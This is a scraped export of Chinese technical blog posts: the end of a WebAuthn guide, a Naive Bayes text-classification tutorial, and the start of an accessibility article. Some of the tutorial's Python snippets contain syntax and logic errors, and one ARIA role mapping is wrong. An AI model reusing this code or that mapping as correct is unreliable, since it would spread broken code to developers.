中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 